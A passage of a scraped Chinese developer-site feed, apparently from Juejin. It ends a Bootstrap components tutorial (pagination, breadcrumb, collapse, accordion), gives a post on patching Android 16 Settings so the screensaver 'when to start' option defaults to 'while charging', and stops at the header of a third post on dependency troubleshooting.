        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span>&gt;</span>下一页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a270bb77950342d387bccd05eacedbdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=N%2F0durP1vbdYIG467TG852u5x5w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-174">Bootstrap 面包屑</h2>
<p>面包屑是一种导航，用于显示用户指示当前的位置，面包屑可以极大增强具有大量页面或负责页面层级的可访问性。我们可以通过<code>.breadcrumb</code>类来进行设置面包屑。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14202b478c2b4d26840fb519526969d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=24PYpAxN811uQfGGDwLq4rOfIac%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-175">Bootstrap 折叠</h2>
<p>当我们需要隐藏和显示大量元素时我们就可以使用折叠组件。我们通过<code>.collapse</code>指示可折叠元素通过单击来显示或隐藏按钮内容。对于<code>a</code>标签我们可以使用<code>data-bs-targer</code>属性。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container m-3"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#demo1"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"collapse"</span>&gt;</span>折叠<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"demo1"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"collapse"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>显示内容<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"collapse"</span> <span class="hljs-attr">data-bs-target</span>=<span class="hljs-string">"#demo1"</span>&gt;</span>折叠<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b420e3cee89f4aec801b3c8a353527b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=t5i6ZSnALPHjlK%2Bt4pcJPHlGc2w%3D" alt="" loading="lazy"/></p>
<p>默认情况折叠内容是隐藏的我们可以通过<code>.show</code>来设置折叠内容默认显示。</p>
<h2 data-id="heading-176">Bootstrap 手风琴</h2>
<p>手风琴菜单和小部件广泛用于web应用程序中，主要作用是管理少量区域内的大量内容和导航列表。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"accordion m-3"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myAccordion"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"accordion-item"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"accordion-header"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"headingOne"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"accordion-button collapsed"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"collapse"</span> <span class="hljs-attr">data-bs-target</span>=<span class="hljs-string">"#collapseOne"</span>&gt;</span>选项1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"collapseOne"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"accordion-collapse collapse"</span> <span class="hljs-attr">data-bs-parent</span>=<span class="hljs-string">"#myAccordion"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56045d9cd00549ec935bf6ea483810cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=82Wo6IgQVkjUCJD2JpMjXsmPjjA%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[安卓16屏保中的启用时机，选项不正确]]></title>    <link>https://juejin.cn/post/7591816944729538596</link>    <guid>https://juejin.cn/post/7591816944729538596</guid>    <pubDate>2026-01-06T08:11:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591816944729538596" data-draft-id="7591816944729260068" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="安卓16屏保中的启用时机，选项不正确"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-06T08:11:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="robotx"/> <meta itemprop="url" content="https://juejin.cn/user/3817944287025453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            安卓16屏保中的启用时机，选项不正确
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817944287025453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    robotx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:11:10.000Z" title="Tue Jan 06 2026 08:11:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">修改的文件</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a39d31dc0f3f4d59acb9605c89db2083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768292052&amp;x-signature=kSNdyy7qrVOZAgjBVpwE7Jl2L0Q%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">问题描述</h2>
<pre><code class="hljs">设置 - 显示 - 启用屏保 - 启用时机中显示的是“一律不”，实际点开查看没有该选项，并且实际选中的是“充电时”，虽然显示“充电时”被选中，但充电时仍然没有屏保，只有你再点击一次“充电时”选项才会有充电屏保。
</code></pre>
<h3 data-id="heading-2"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9363a1b8ae3e4332afa5dd0a364614f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768292052&amp;x-signature=4SNwbbh4nwvubQupgydISdgdTKE%3D" alt="image.png" loading="lazy"/></h3>
<p>同时点开“启用时机”这个选项后，发现只有“充电时”，没有“一律不”。</p>
<h2 data-id="heading-3">想法</h2>
<p>确保图片中这个地方只显示“充电时”，且无需进入二级菜单再点击一次“充电时”选项（同时二级菜单只有“充电时”这一个选项）。即目标是，只要打开“启用屏保”按钮。就自动在充电时开启“屏保”。</p>
<h2 data-id="heading-4">修改过程</h2>
<h3 data-id="heading-5"><code>后续代码修改均位于packages/apps/Settings模块</code></h3>
<pre><code class="hljs language-xml" lang="xml">res/values/arrays.xml
“启用时机”二级菜单选项的增减示例

<span class="hljs-comment">&lt;!-- Options for screensaver "When to start" for devices that do not support screensavers
         while on battery --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string-array</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"when_to_start_screensaver_entries_no_battery"</span> <span class="hljs-attr">translatable</span>=<span class="hljs-string">"false"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>@string/screensaver_settings_summary_sleep<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">string-array</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Values for screensaver "When to start" for devices that do not support screensavers
         while on battery --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string-array</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"when_to_start_screensaver_values_no_battery"</span> <span class="hljs-attr">translatable</span>=<span class="hljs-string">"false"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>while_charging_only<span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">string-array</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">首先修改 默认提示语</h3>
<p>将图片中的“一律不”替换为“充电时”</p>
<pre><code class="hljs language-xml" lang="xml">根据“启用时机”名称定位到选项在xml中的位置，跟WhenToDreamPicker这个fragment有关，但这个fragment实际负责的是二级菜单内容，只有你点开这个二级菜单的时候才会执行，因此不修改这个fragment。
<span class="hljs-tag">&lt;<span class="hljs-name">Preference</span>
        <span class="hljs-attr">android:key</span>=<span class="hljs-string">"when_to_start"</span>
        <span class="hljs-attr">android:title</span>=<span class="hljs-string">"@string/screensaver_settings_when_to_dream"</span>
        <span class="hljs-attr">android:fragment</span>=<span class="hljs-string">"com.android.settings.dream.WhenToDreamPicker"</span>/&gt;</span>
</code></pre>
<hr/>
<p>实际负责“启用时机”一级菜单显示的是WhenToDreamPreferenceController.java。<code>updateState</code>负责更新一级菜单的ui，调用getSummaryResId，走的是getSummaryResId的else分支，else分支又调用<code>DreamSettings.getDreamSettingDescriptionResId</code></p>
<pre><code class="hljs language-java" lang="java">实际负责“启用时机”一级菜单显示的是WhenToDreamPreferenceController.java

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateState</span><span class="hljs-params">(Preference preference)</span> {
    Log.d(<span class="hljs-string">"cmy"</span>, <span class="hljs-string">"ENTER updateState()"</span>);
    <span class="hljs-built_in">super</span>.updateState(preference);

    preference.setSummary(getSummaryResId());
}


<span class="hljs-keyword">private</span> <span class="hljs-meta">@StringRes</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSummaryResId</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (mDreamsDisabledByAmbientModeSuppression
            &amp;&amp; AmbientDisplayAlwaysOnPreferenceController.isAodSuppressedByBedtime(mContext)) {
        Log.d(<span class="hljs-string">"cmy"</span>, <span class="hljs-string">"getSummaryResId-R.string.screensaver_settings_when_to_dream_bedtime = "</span>+R.string.screensaver_settings_when_to_dream_bedtime);
        <span class="hljs-keyword">return</span> R.string.screensaver_settings_when_to_dream_bedtime;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">resId</span> <span class="hljs-operator">=</span> DreamSettings.getDreamSettingDescriptionResId(
                mBackend.getWhenToDreamSetting(), mDreamsEnabledOnBattery);
        Log.d(<span class="hljs-string">"cmy"</span>, <span class="hljs-string">"getSummaryResId-resId = "</span>+resId);
        <span class="hljs-keyword">return</span> resId;
    }
}
</code></pre>
<hr/>
<pre><code class="hljs language-java" lang="java">DreamSettings.java

<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDreamSettingDescriptionResId</span><span class="hljs-params">(<span class="hljs-meta">@WhenToDream</span> <span class="hljs-type">int</span> dreamSetting,
            <span class="hljs-type">boolean</span> enabledOnBattery)</span> {
        <span class="hljs-comment">//enabledOnBattery值一直是false。</span>
        <span class="hljs-comment">//当显示“一律不”时dreamSetting，dreamSetting=4.</span>
        <span class="hljs-comment">//当显示“充电时”时dreamSetting，dreamSetting=0.</span>
        Log.d(<span class="hljs-string">"cmy-"</span>+TAG, <span class="hljs-string">"dreamSetting = "</span>+dreamSetting+<span class="hljs-string">"   --- enabledOnBattery = "</span>+enabledOnBattery);
        
        <span class="hljs-keyword">switch</span> (dreamSetting) {
            <span class="hljs-keyword">case</span> DreamBackend.WHILE_CHARGING:
                <span class="hljs-keyword">return</span> R.string.screensaver_settings_summary_sleep;
            <span class="hljs-keyword">case</span> DreamBackend.WHILE_DOCKED:
                <span class="hljs-keyword">return</span> enabledOnBattery ? R.string.screensaver_settings_summary_dock
                        : R.string.screensaver_settings_summary_dock_and_charging;
            <span class="hljs-keyword">case</span> DreamBackend.WHILE_CHARGING_OR_DOCKED:
                <span class="hljs-keyword">return</span> R.string.screensaver_settings_summary_either_long;
            <span class="hljs-keyword">case</span> DreamBackend.WHILE_POSTURED:
                <span class="hljs-keyword">return</span> enabledOnBattery ? R.string.screensaver_settings_summary_postured
                        : R.string.screensaver_settings_summary_postured_and_charging;
            <span class="hljs-keyword">case</span> DreamBackend.NEVER:
                <span class="hljs-comment">// 这里修改为，如果值是“一律不”，返回“充电时”的字符串</span>
                Log.d(<span class="hljs-string">"cmy-"</span>+TAG, <span class="hljs-string">"case DreamBackend.NEVER TO CHARGING"</span>);
                <span class="hljs-keyword">return</span> R.string.screensaver_settings_summary_sleep;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> R.string.screensaver_settings_summary_never;
        }
    }
</code></pre>
<h3 data-id="heading-7">选项默认值修改</h3>
<p>因为要的效果是，当“启用屏保”按钮开启时，打开充电屏保，否则就关闭，因此默认值的设置跟“启用屏保”按钮相关，负责这个按钮的是<code>DreamMainSwitchPreferenceController.java</code>，点击按钮时，其中的<code>setChecked</code>方法都会执行。</p>
<pre><code class="hljs language-java" lang="java">DreamMainSwitchPreferenceController.java

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">setChecked</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isChecked)</span> {
    Log.d(<span class="hljs-string">"cmy"</span>, <span class="hljs-string">"ENTER setChecked() AND isChecked = "</span>+isChecked);
    mBackend.setEnabled(isChecked);

    <span class="hljs-comment">// 2. 核心修复逻辑：如果开关被打开 (isChecked 为 true)</span>
    <span class="hljs-keyword">if</span> (isChecked) {
        <span class="hljs-comment">// 获取当前的启动时机</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">currentSetting</span> <span class="hljs-operator">=</span> mBackend.getWhenToDreamSetting();

        <span class="hljs-comment">// 如果当前时机是 4 (WHILE_NEVER / 一律不)</span>
        <span class="hljs-keyword">if</span> (currentSetting == <span class="hljs-number">4</span>) { 
            Log.d(<span class="hljs-string">"cmy-DMSPC"</span>, <span class="hljs-string">"Current is Never, forcing to While Charging"</span>);
            <span class="hljs-comment">// 强制将其设置为 0 (WHILE_CHARGING_ONLY / 充电时)</span>
            mBackend.setWhenToDream(<span class="hljs-number">0</span>);
        }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Android】第三方库依赖引发的异常情况排查]]></title>    <link>https://juejin.cn/post/7592058763986321454</link>    <guid>https://juejin.cn/post/7592058763986321454</guid>    <pubDate>2026-01-06T09:17:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763986321454" data-draft-id="7591986565855068206" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Android】第三方库依赖引发的异常情况排查"/> <meta itemprop="keywords" content="Android,Android Studio"/> <meta itemprop="datePublished" content="2026-01-06T09:17:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JulyYu"/> <meta itemprop="url" content="https://juejin.cn/user/817692383122408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Android】第三方库依赖引发的异常情况排查
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692383122408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JulyYu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:17:56.000Z" title="Tue Jan 06 2026 09:17:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
